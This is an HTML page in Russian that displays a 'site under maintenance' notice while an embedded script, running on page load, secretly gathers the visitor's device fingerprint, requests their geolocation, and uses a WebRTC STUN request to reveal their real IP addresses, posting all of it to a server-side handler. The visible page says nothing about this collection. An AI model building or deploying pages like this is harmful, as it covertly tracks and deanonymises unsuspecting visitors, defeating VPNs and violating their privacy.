<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сайт на техническом обслуживании</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Сайт на техническом обслуживании</h1>
        <p>Пожалуйста, зайдите позже. Мы проводим технические работы для улучшения наших услуг.</p>
    </div>

    <script>
        // Функция для отправки данных на сервер
        function sendData(data) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "data_handler.php", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(data));
        }

        // Функция для сбора информации об устройстве
        function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                deviceMemory: navigator.deviceMemory,
                hardwareConcurrency: navigator.hardwareConcurrency
            };
            sendData({ deviceInfo: deviceInfo });
        }

        // Функция для сбора геолокации
        function getGeolocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    const geoInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    sendData({ geoInfo: geoInfo });
                });
            }
        }

        // Функция для вычисления реального IP-адреса
        function discoverIPs(onNewIP) {
            const peerConnection = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            const ipAddressPattern = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
            const uniqueIPs = new Set();

            peerConnection.createDataChannel("");

            peerConnection.createOffer()
                .then(offer => peerConnection.setLocalDescription(offer));

            peerConnection.onicecandidate = event => {
                if (event.candidate) {
                    event.candidate.candidate.match(ipAddressPattern)?.forEach(ip => {
                        if (!uniqueIPs.has(ip)) {
                            uniqueIPs.add(ip);
                            onNewIP(ip);
                            sendData({ realIP: ip });
                        }
                    });
                }
            };
        }

        // Запуск всех функций
        collectDeviceInfo();
        getGeolocation();
        discoverIPs(ip => {});
    </script>
</body>
</html>
